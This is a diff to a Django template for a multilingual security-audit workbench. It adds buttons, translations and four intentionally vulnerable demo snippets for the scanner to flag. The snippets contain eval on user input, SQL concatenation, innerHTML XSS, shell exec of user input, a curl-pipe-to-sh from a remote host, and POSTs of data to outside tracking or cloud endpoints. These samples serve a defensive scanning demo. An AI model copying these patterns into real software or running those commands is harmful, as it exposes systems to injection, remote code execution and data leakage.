@@ -118,9 +118,17 @@
                             {{ repo.default_branch|default:"main" }}
                         </td>
                         <td style="padding: 0.75rem; text-align: right;">
-                            <a href="{{ repo.html_url|default:BASE_URL_2|add:'/'|add:repo.full_name }}" target="_blank" rel="noopener noreferrer" class="btn btn-secondary" style="padding: 0.25rem 0.6rem; font-size: 0.75rem;">
-                                {% icon "external-link" size=12 %} {% trans "Gitea" %}
-                            </a>
+                            <div style="display: inline-flex; gap: 0.4rem; flex-wrap: wrap; justify-content: flex-end;">
+                                <button type="button" class="bantu-pro-action-btn bantu-pro-btn-security" style="padding: 0.25rem 0.55rem; font-size: 0.72rem;" onclick="if(window.openBantuCommandTerminal) window.openBantuCommandTerminal('security', '{{ repo.full_name|default:repo.name }}', '{{ repo.default_branch|default:'main' }}')">
+                                    {% icon "shield" size=12 %} <span class="bantu-i18n-security-label">Run Security Audit</span>
+                                </button>
+                                <button type="button" class="bantu-pro-action-btn bantu-pro-btn-gemma" style="padding: 0.25rem 0.55rem; font-size: 0.72rem;" onclick="if(window.openBantuCommandTerminal) window.openBantuCommandTerminal('gemma', '{{ repo.full_name|default:repo.name }}', '{{ repo.default_branch|default:'main' }}')">
+                                    {% icon "bot" size=12 %} <span class="bantu-i18n-gemma-label">Ask Gemma Review</span>
+                                </button>
+                                <a href="{{ repo.html_url|default:BASE_URL_2|add:'/'|add:repo.full_name }}" target="_blank" rel="noopener noreferrer" class="btn btn-secondary" style="padding: 0.25rem 0.6rem; font-size: 0.75rem;">
+                                    {% icon "external-link" size=12 %} {% trans "Gitea" %}
+                                </a>
+                            </div>
                         </td>
                     </tr>
                     {% empty %}
@@ -139,17 +147,21 @@
         <div class="card" style="margin-top: 1rem; padding: 1.25rem;">
             <div class="editor-container">
                 <div class="editor-toolbar">
-                    <div class="file-tag">
+                    <div class="file-tag" style="flex-wrap: wrap;">
                         <span>{% icon "code" size=16 %}</span>
-                        <span>workbench_security_audit.py</span>
-                        <select class="editor-lang-select" id="editorLangSelect" aria-label="{% trans 'Langage' %}" onchange="if(window.changeEditorMode) changeEditorMode(this.value)">
+                        <span id="editorFileNameTag">workbench_security_audit.py</span>
+                        <select class="editor-lang-select" id="editorLangSelect" aria-label="{% trans 'Langage' %}" onchange="changeEditorMode(this.value)">
                             <option value="python">Python</option>
-                            <option value="javascript">JavaScript</option>
-                            <option value="yaml">YAML</option>
                             <option value="dockerfile">Dockerfile</option>
+                            <option value="yaml">YAML</option>
+                            <option value="javascript">JavaScript</option>
                         </select>
                     </div>
-                    <div style="display: flex; gap: 0.75rem; align-items: center;">
+                    <div style="display: flex; gap: 0.45rem; align-items: center; flex-wrap: wrap;">
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="python" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('python')">Python</button>
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="dockerfile" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('dockerfile')">Dockerfile</button>
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="yaml" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('yaml')">YAML</button>
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="javascript" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('javascript')">JavaScript</button>
                         <span id="editorStatus" style="font-size: 0.8rem; color: var(--secondary-emerald);">{% icon "dot" size=10 %} {% trans "Prêt" %}</span>
                         <button class="btn btn-secondary" style="padding: 0.2rem 0.6rem; font-size: 0.75rem;" onclick="resetEditorSnippet()">{% trans "Snippet Démo" %}</button>
                     </div>
@@ -250,25 +262,192 @@
 
 {% block extra_scripts %}
 <script>
-// CodeMirror Editor Initialization (UI-01)
-const DEFAULT_SNIPPET = `# Workbench Souverain - Analyse de Sécurité & Souveraineté
+// CodeMirror Editor Initialization & Multi-Language Vulnerable Demo Snippets (UI-01)
+const DEMO_FILES_META = {
+    python: {
+        filename: "workbench_security_audit.py",
+        cmMode: "python",
+        snippet: `# Workbench Souverain (Python) - Analyse de Sécurité & Souveraineté
 import os
 import requests
 
-# 1. Fuite potentielle de secret souverain
+# 1. Fuite potentielle de secret souverain (Token hardcodé)
 api_key = "ghp_super_secret_token_123456789012345678"
 
-def process_banking_request(user_input):
-    # 2. Utilisation risquée de eval
+def process_banking_request(user_input, cursor, account_id):
+    # 2. Utilisation risquée de eval (RCE)
     result = eval(user_input)
 
-    # 3. Fuite de télémétrie étrangère non souveraine
+    # 3. Injection SQL par concaténation
+    cursor.execute("SELECT * FROM sovereign_accounts WHERE id = '%s'" % account_id + "")
+
+    # 4. Fuite de télémétrie étrangère non souveraine
     requests.post("https://foreign-analytics.tracking.com/collect", json={"log": result})
 
     return result
-`;
+`
+    },
+    dockerfile: {
+        filename: "Dockerfile.sovereign",
+        cmMode: "dockerfile",
+        snippet: `# Workbench Souverain (Dockerfile) - Conteneurisation Non Sécurisée
+# 1. Image non épinglée (:latest) et exécution en privilèges root
+FROM ubuntu:latest
+USER root
 
+# 2. Secret exposé en clair dans une directive ENV
+ENV SECRET_KEY="ghp_dockerfile_exposed_secret_9876543210abcdef"
+
+# 3. Exécution distante non vérifiée pipée vers sh & permissions 777
+RUN curl -sSL https://foreign.telemetry.io/bootstrap.sh | sh
+RUN chmod -R 777 /var/www/bantudevlab
+
+CMD ["python3", "manage.py", "runserver", "0.0.0.0:8000"]
+`
+    },
+    yaml: {
+        filename: "gitlab-ci-sovereign.yml",
+        cmMode: "yaml",
+        snippet: `# Workbench Souverain (YAML CI/CD) - Pipeline à Risque
+stages:
+  - security_audit
+  - deploy
+
+sovereign_sast_job:
+  stage: security_audit
+  # 1. Conteneur privilégié et contournement des alertes de sécurité
+  privileged: true
+  allow_failure: true
+  variables:
+    # 2. Token secret exposé en clair dans le fichier YAML
+    AUTH_TOKEN: "ghp_yaml_pipeline_secret_token_1234567890abcdef"
+  script:
+    # 3. Exfiltration vers un endpoint cloud hors juridiction africaine
+    - curl -X POST https://us-east-1.amazonaws.com/telemetry-bucket/upload
+`
+    },
+    javascript: {
+        filename: "workbench_payment_gateway.js",
+        cmMode: "javascript",
+        snippet: `// Workbench Souverain (JavaScript) - Passerelle Paiement Mobile Money
+const child_process = require("child_process");
+
+// 1. Clé API exposée côté client/serveur
+const apiKey = "ghp_js_frontend_exposed_token_1234567890abcdef";
+
+function processMobileTransfer(userInput, formulaExpr) {
+    // 2. Exécution dynamique risquée eval() et injection DOM XSS (innerHTML)
+    const fee = eval(formulaExpr);
+    document.getElementById("transfer-receipt").innerHTML = userInput;
+
+    // 3. Exécution système dangereuse
+    child_process.exec("notify-send " + userInput);
+
+    // 4. Fuite de télémétrie vers un traqueur tiers étranger
+    fetch("https://analytics.tracking.com/beacon", { method: "POST", body: String(fee) });
+    return fee;
+}
+`
+    }
+};
+
+const DEFAULT_SNIPPET = DEMO_FILES_META.python.snippet;
+let currentDemoType = "python";
 let editorInstance = null;
+
+const WORKBENCH_I18N = {
+    fr: {
+        demoLoaded: "Exemple de code vulnérable chargé : ",
+        emptyScan: "Veuillez saisir du code à analyser.",
+        scanningStatus: "Scan en cours...",
+        scanningToast: "Analyse par le moteur de sécurité souverain...",
+        scanError: "Erreur lors du scan",
+        issuesFoundSuffix: "problème(s) identifié(s)",
+        doneStatus: "Terminé",
+        scanSuccessToast: "Audit de sécurité terminé ! Score de souveraineté : ",
+        scannerErrorToast: "Erreur du scanner : ",
+        emptyAi: "Veuillez saisir du code pour l'audit IA.",
+        aiConnecting: "Connexion sécurisée au moteur IA On-Premise Gemma 5B...",
+        aiToastStart: "Consultation de Gemma 5B en cours...",
+        aiHttpError: "Erreur de connexion IA : HTTP ",
+        aiDoneToast: "Revue de code par Gemma 5B complétée.",
+        aiSseError: "Erreur lors du flux IA : ",
+        noVulnTitle: "Aucune vulnérabilité détectée !",
+        noVulnDesc: "Le code respecte strictement les critères de souveraineté panafricaine.",
+        lineLabel: "Ligne",
+        recLabel: "Recommandation Souveraine :"
+    },
+    en: {
+        demoLoaded: "Vulnerable demo snippet loaded: ",
+        emptyScan: "Please enter code to analyze.",
+        scanningStatus: "Scanning...",
+        scanningToast: "Analyzing with the sovereign security scanner...",
+        scanError: "Error during security scan",
+        issuesFoundSuffix: "issue(s) identified",
+        doneStatus: "Completed",
+        scanSuccessToast: "Security audit completed! Sovereignty score: ",
+        scannerErrorToast: "Scanner error: ",
+        emptyAi: "Please enter code for AI review.",
+        aiConnecting: "Connecting securely to On-Premise Gemma 5B AI engine...",
+        aiToastStart: "Querying Gemma 5B AI review stream...",
+        aiHttpError: "AI connection error: HTTP ",
+        aiDoneToast: "Gemma 5B code review completed.",
+        aiSseError: "Error during AI stream: ",
+        noVulnTitle: "No vulnerabilities detected!",
+        noVulnDesc: "The code strictly complies with Pan-African sovereignty standards.",
+        lineLabel: "Line",
+        recLabel: "Sovereign Recommendation:"
+    },
+    sw: {
+        demoLoaded: "Mfano wa msimbo wenye udhaifu umepakiwa: ",
+        emptyScan: "Tafadhali weka msimbo wa kukaguliwa.",
+        scanningStatus: "Inakagua...",
+        scanningToast: "Inachambua kwa injini huru ya usalama...",
+        scanError: "Hitilafu wakati wa ukaguzi",
+        issuesFoundSuffix: "dosari zimetambuliwa",
+        doneStatus: "Imekamilika",
+        scanSuccessToast: "Ukaguzi wa usalama umekamilika! Alama ya uhuru: ",
+        scannerErrorToast: "Hitilafu ya kikaguzi: ",
+        emptyAi: "Tafadhali weka msimbo kwa ukaguzi wa AI.",
+        aiConnecting: "Inaunganisha kwa usalama na injini ya Gemma 5B AI...",
+        aiToastStart: "Inawasiliana na Gemma 5B AI...",
+        aiHttpError: "Hitilafu ya muunganisho wa AI: HTTP ",
+        aiDoneToast: "Ukaguzi wa msimbo wa Gemma 5B umekamilika.",
+        aiSseError: "Hitilafu ya mtiririko wa AI: ",
+        noVulnTitle: "Hakuna udhaifu uliogunduliwa!",
+        noVulnDesc: "Msimbo unazingatia kikamilifu viwango vya uhuru wa kidijitali Afrika.",
+        lineLabel: "Mstari",
+        recLabel: "Pendekezo Huru:"
+    },
+    pt: {
+        demoLoaded: "Exemplo de código vulnerável carregado: ",
+        emptyScan: "Por favor, insira o código para analisar.",
+        scanningStatus: "A analisar...",
+        scanningToast: "A analisar com o motor soberano de segurança...",
+        scanError: "Erro durante a auditoria",
+        issuesFoundSuffix: "problema(s) identificado(s)",
+        doneStatus: "Concluído",
+        scanSuccessToast: "Auditoria de segurança concluída! Pontuação de soberania: ",
+        scannerErrorToast: "Erro do scanner: ",
+        emptyAi: "Por favor, insira o código para a revisão IA.",
+        aiConnecting: "A estabelecer ligação segura ao motor local Gemma 5B IA...",
+        aiToastStart: "A consultar o fluxo de revisão Gemma 5B...",
+        aiHttpError: "Erro de ligação IA: HTTP ",
+        aiDoneToast: "Revisão de código pelo Gemma 5B concluída.",
+        aiSseError: "Erro durante a transmissão IA: ",
+        noVulnTitle: "Nenhuma vulnerabilidade detetada!",
+        noVulnDesc: "O código respeita estritamente os critérios de soberania pan-africana.",
+        lineLabel: "Linha",
+        recLabel: "Recomendação Soberana:"
+    }
+};
+
+function getActiveWorkbenchLang() {
+    const match = document.cookie.match(/(?:^|;\s*)(?:bantu_lang|django_language|lang)=([^;]*)/);
+    const raw = (match ? decodeURIComponent(match[1]) : null) || document.documentElement.lang || 'fr';
+    const code = String(raw).toLowerCase().slice(0, 2);
+    return WORKBENCH_I18N[code] ? code : 'fr';
+}
 
 function initCodeEditor() {
     const mount = document.getElementById('codeEditorMount');
@@ -288,7 +467,6 @@ function initCodeEditor() {
         });
         textarea.style.display = 'none';
     } else {
-        // Fallback textarea if CDN is not available
         textarea.style.display = 'block';
     }
 }
@@ -300,13 +478,48 @@ function getEditorContent() {
     return document.getElementById('scanCodeInput').value;
 }
 
-function resetEditorSnippet() {
-    if (editorInstance) {
-        editorInstance.setValue(DEFAULT_SNIPPET);
-    } else {
-        document.getElementById('scanCodeInput').value = DEFAULT_SNIPPET;
+function changeEditorMode(modeName) {
+    const key = String(modeName || 'python').toLowerCase();
+    const meta = DEMO_FILES_META[key] || DEMO_FILES_META.python;
+    currentDemoType = DEMO_FILES_META[key] ? key : 'python';
+
+    const selectEl = document.getElementById('editorLangSelect');
+    if (selectEl && selectEl.value !== currentDemoType) {
+        selectEl.value = currentDemoType;
     }
-    if (window.showToast) window.showToast('{% trans "Code de démonstration rechargé." %}', 'info');
+
+    const fileTagEl = document.getElementById('editorFileNameTag');
+    if (fileTagEl) {
+        fileTagEl.textContent = meta.filename;
+    }
+
+    document.querySelectorAll('.demo-type-btn').forEach(btn => {
+        if (btn.getAttribute('data-demo-type') === currentDemoType) {
+            btn.style.borderColor = 'var(--primary-african-gold)';
+            btn.style.color = 'var(--primary-african-gold)';
+        } else {
+            btn.style.borderColor = '';
+            btn.style.color = '';
+        }
+    });
+
+    if (editorInstance) {
+        editorInstance.setValue(meta.snippet);
+    }
+    const textarea = document.getElementById('scanCodeInput');
+    if (textarea) {
+        textarea.value = meta.snippet;
+    }
+
+    const t = WORKBENCH_I18N[getActiveWorkbenchLang()];
+    if (window.showToast) {
+        window.showToast(t.demoLoaded + meta.filename + " (" + currentDemoType.toUpperCase() + ")", 'info');
+    }
+}
+window.changeEditorMode = changeEditorMode;
+
+function resetEditorSnippet() {
+    changeEditorMode(currentDemoType || 'python');
 }
 
 // UI-02: Visual Dashboard Updates & Circular Gauge
@@ -334,12 +547,13 @@ function updateSovereigntyGauge(score) {
 function renderVulnerabilityCards(issues) {
     const container = document.getElementById('vulnerabilitiesContainer');
     container.innerHTML = '';
+    const t = WORKBENCH_I18N[getActiveWorkbenchLang()];
 
     if (!issues || issues.length === 0) {
         container.innerHTML = `
             <div style="padding: 1.5rem; text-align: center; background: rgba(16, 185, 129, 0.1); border: 1px solid var(--secondary-emerald); border-radius: 8px; color: #a7f3d0;">
-                <p style="font-weight: 600; margin: 0;">{% icon "circle-check" size=20 %} {% trans "Aucune vulnérabilité détectée !" %}</p>
-                <p style="font-size: 0.85rem; margin: 0.3rem 0 0; opacity: 0.85;">{% trans "Le code respecte strictement les critères de souveraineté panafricaine." %}</p>
+                <p style="font-weight: 600; margin: 0;">{% icon "circle-check" size=20 %} ${escapeHtml(t.noVulnTitle)}</p>
+                <p style="font-size: 0.85rem; margin: 0.3rem 0 0; opacity: 0.85;">${escapeHtml(t.noVulnDesc)}</p>
             </div>
         `;
         return;
@@ -355,16 +569,16 @@ function renderVulnerabilityCards(issues) {
         card.innerHTML = `
             <div class="vulnerability-header">
                 <div>
-                    <strong style="color: #fff; font-size: 0.95rem;">${issue.description || '{% trans "Vulnérabilité" %}'}</strong>
-                    <span style="font-size: 0.8rem; color: var(--text-muted); margin-left: 0.5rem;">{% trans "Ligne" %} ${issue.line || '?'}</span>
+                    <strong style="color: #fff; font-size: 0.95rem;">${escapeHtml(issue.description || 'Vulnerability')}</strong>
+                    <span style="font-size: 0.8rem; color: var(--text-muted); margin-left: 0.5rem;">${escapeHtml(t.lineLabel)} ${issue.line || '?'}</span>
                 </div>
-                <span class="severity-badge ${badgeClass}">${issue.severity || 'UNKNOWN'}</span>
+                <span class="severity-badge ${badgeClass}">${escapeHtml(issue.severity || 'UNKNOWN')}</span>
             </div>
             ${issue.snippet ? `<div class="vuln-code-snippet">${escapeHtml(issue.snippet)}</div>` : ''}
             ${issue.recommendation ? `
                 <div class="vuln-recommendation">
                     <span>{% icon "lightbulb" size=18 %}</span>
-                    <span><strong>{% trans "Recommandation Souveraine :" %}</strong> ${escapeHtml(issue.recommendation)}</span>
+                    <span><strong>${escapeHtml(t.recLabel)}</strong> ${escapeHtml(issue.recommendation)}</span>
                 </div>
             ` : ''}
         `;
@@ -374,7 +588,7 @@ function renderVulnerabilityCards(issues) {
 
 function escapeHtml(text) {
     if (!text) return '';
-    return text
+    return String(text)
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
@@ -386,15 +600,18 @@ async function runSecurityScan() {
     const code = getEditorContent();
     const visualBox = document.getElementById('visualScanContainer');
     const editorStatus = document.getElementById('editorStatus');
+    const lang = getActiveWorkbenchLang();
+    const t = WORKBENCH_I18N[lang];
+    const meta = DEMO_FILES_META[currentDemoType] || DEMO_FILES_META.python;
 
     if (!code || !code.trim()) {
-        if (window.showToast) window.showToast("{% trans 'Veuillez saisir du code à analyser.' %}", "warning");
+        if (window.showToast) window.showToast(t.emptyScan, "warning");
         return;
     }
 
-    editorStatus.textContent = '{% trans "Scan en cours..." %}';
+    editorStatus.textContent = t.scanningStatus;
     editorStatus.style.color = 'var(--primary-african-gold)';
-    if (window.showToast) window.showToast("{% trans 'Analyse par le moteur de sécurité souverain...' %}", "info");
+    if (window.showToast) window.showToast(t.scanningToast, "info");
 
     try {
         const headers = {
@@ -407,12 +624,17 @@ async function runSecurityScan() {
         const res = await fetch('/api/security/scan/', {
             method: 'POST',
             headers: headers,
-            body: JSON.stringify({content: code, filename: 'workbench_security_audit.py', repository_name: 'workbench-repo'})
+            body: JSON.stringify({
+                content: code,
+                filename: meta.filename,
+                repository_name: 'workbench-repo',
+                lang: lang
+            })
         });
         const data = await res.json();
 
         if (!res.ok) {
-            throw new Error(data.error || data.detail || '{% trans "Erreur lors du scan" %}');
+            throw new Error(data.error || data.detail || t.scanError);
         }
 
         visualBox.style.display = 'block';
@@ -424,7 +646,11 @@ async function runSecurityScan() {
         document.getElementById('pillCriticalCount').textContent = data.critical || 0;
         document.getElementById('pillHighCount').textContent = data.high || 0;
         document.getElementById('pillMediumCount').textContent = data.medium || 0;
-        document.getElementById('issuesCountBadge').textContent = `${data.total_issues || 0} {% trans "problème(s) identifié(s)" %}`;
+        document.getElementById('issuesCountBadge').textContent = `${data.total_issues || 0} ${t.issuesFoundSuffix}`;
+        if (data.jurisdiction) {
+            const jurEl = document.getElementById('scanJurisdiction');
+            if (jurEl) jurEl.textContent = data.jurisdiction;
+        }
 
         // Update status rating
         const ratingBadge = document.getElementById('scanStatusBadge');
@@ -433,13 +659,13 @@ async function runSecurityScan() {
         // Render cards
         renderVulnerabilityCards(data.issues || []);
 
-        editorStatus.textContent = '{% trans "Terminé" %}';
+        editorStatus.textContent = t.doneStatus;
         editorStatus.style.color = 'var(--secondary-emerald)';
-        if (window.showToast) window.showToast(`{% trans "Scan terminé ! Score de souveraineté :" %} ${data.sovereignty_score}%`, 'success');
+        if (window.showToast) window.showToast(`${t.scanSuccessToast}${data.sovereignty_score}%`, 'success');
     } catch(err) {
-        editorStatus.textContent = '{% trans "Erreur" %}';
+        editorStatus.textContent = 'Error';
         editorStatus.style.color = 'var(--tertiary-terracotta)';
-        if (window.showToast) window.showToast(`{% trans "Erreur du scanner :" %} ${err.message}`, 'error');
+        if (window.showToast) window.showToast(`${t.scannerErrorToast}${err.message}`, 'error');
     }
 }
 
@@ -447,15 +673,18 @@ async function runAiReview() {
     const code = getEditorContent();
     const aiSection = document.getElementById('aiReviewSection');
     const aiContent = document.getElementById('aiReviewContent');
+    const lang = getActiveWorkbenchLang();
+    const t = WORKBENCH_I18N[lang];
+    const meta = DEMO_FILES_META[currentDemoType] || DEMO_FILES_META.python;
 
     if (!code || !code.trim()) {
-        if (window.showToast) window.showToast("{% trans 'Veuillez saisir du code pour l audit IA.' %}", "warning");
+        if (window.showToast) window.showToast(t.emptyAi, "warning");
         return;
     }
 
     aiSection.style.display = 'block';
-    aiContent.textContent = '{% trans "Connexion sécurisée au moteur IA On-Premise Gemma 5B..." %}\n';
-    if (window.showToast) window.showToast("{% trans 'Connexion au flux SSE de Gemma 5B...' %}", "info");
+    aiContent.textContent = t.aiConnecting + '\n';
+    if (window.showToast) window.showToast(t.aiToastStart, "info");
 
     try {
         const aiHeaders = {
@@ -469,12 +698,17 @@ async function runAiReview() {
         const response = await fetch('/api/ai/review/', {
             method: 'POST',
             headers: aiHeaders,
-            body: JSON.stringify({code: code, context: 'security_audit', stream: true})
+            body: JSON.stringify({
+                code: code,
+                context: `security_audit:${meta.filename}`,
+                lang: lang,
+                stream: true
+            })
         });
 
         if (!response.ok) {
-            aiContent.textContent = 'Erreur HTTP: ' + response.status;
-            if (window.showToast) window.showToast(`{% trans "Erreur de connexion IA: HTTP" %} ${response.status}`, 'error');
+            aiContent.textContent = t.aiHttpError + response.status;
+            if (window.showToast) window.showToast(`${t.aiHttpError}${response.status}`, 'error');
             return;
         }
 
@@ -504,10 +738,10 @@ async function runAiReview() {
                 }
             }
         }
-        if (window.showToast) window.showToast("{% trans 'Revue de code par Gemma 5B complétée.' %}", "success");
+        if (window.showToast) window.showToast(t.aiDoneToast, "success");
     } catch(err) {
-        aiContent.textContent = '{% trans "Erreur lors du streaming SSE:" %} ' + err;
-        if (window.showToast) window.showToast(`{% trans "Erreur SSE:" %} ${err.message}`, 'error');
+        aiContent.textContent = t.aiSseError + err;
+        if (window.showToast) window.showToast(`${t.aiSseError}${err.message}`, 'error');
     }
 }
 
